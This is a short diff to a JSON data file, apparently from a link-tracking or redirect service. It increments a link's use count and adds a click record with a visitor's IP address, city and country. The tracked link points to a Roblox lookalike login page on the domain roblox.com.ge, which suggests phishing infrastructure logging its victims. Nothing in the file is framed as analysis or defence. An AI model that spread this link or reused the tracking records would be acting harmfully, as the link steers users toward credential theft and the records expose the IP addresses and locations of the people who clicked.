@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1636,
+    "useCount": 1637,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13256,6 +13256,14 @@
         "city": "Buon Ma Thuot",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777561128095,
+        "ip": "119.76.35.161",
+        "country": "Thailand",
+        "city": "Bangkok",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
       }
     ]
   },
